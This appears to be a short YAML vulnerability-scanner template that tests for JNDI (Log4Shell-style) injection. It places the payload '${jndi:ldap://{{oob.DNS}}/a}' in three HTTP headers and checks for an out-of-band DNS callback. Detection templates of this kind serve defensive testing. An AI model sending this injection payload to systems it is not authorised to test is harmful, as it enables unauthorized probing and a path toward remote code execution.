id: oob-jndi

info:
  name: OOB JNDI
  author: zan8in
  severity: high

rules:
  r0:
    request:
      method: GET
      path: /jnditest
      headers:
        User-Agent: "${jndi:ldap://{{oob.DNS}}/a}"
        Referer: "${jndi:ldap://{{oob.DNS}}/a}"
        X-Forwarded-For: "${jndi:ldap://{{oob.DNS}}/a}"
    expression: oobCheck(oob.ProtocolDNS, 5)
expression: r0()
